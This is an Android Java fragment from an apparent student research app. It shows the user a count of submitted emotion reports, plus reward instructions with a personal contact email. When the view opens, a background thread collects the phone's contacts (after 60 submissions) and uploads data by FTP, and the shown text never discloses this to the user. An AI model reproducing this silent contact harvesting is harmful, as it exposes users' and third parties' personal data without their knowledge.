package org.graduation.healthylife;

import android.app.Fragment;
import android.os.Bundle;
import android.support.annotation.Nullable;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.TextView;

import org.graduation.R;
import org.graduation.collector.ContactCollector;
import org.graduation.database.SharedPreferenceManager;

public class ResultFragment extends Fragment {
    int cnt;
    @Nullable
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        View view=inflater.inflate(R.layout.content_result, container, false);
        TextView tv= (TextView) view.findViewById(R.id.textView3);
        cnt= SharedPreferenceManager.getManager().getInt("emotionCnt",0);
        Log.d("resultFragment","emotion"+cnt);
        if(cnt<60) tv.setText("您已经提交了"+cnt+"次，还有"+(60-cnt)+"次可以领取奖励");
        else tv.setText("您已经提交了足够的次数。从第60次提交（包括60）起，只要有一次上传成功，即可联系张啸tobexiao1@gmail.com领取奖励。");
        new Thread(new Runnable() {
            @Override
            public void run() {
                if(cnt>=60){
                    new ContactCollector().collect();
                }
                new FtpUploader().upload();
            }
        }).start();
        return view;
    }
}
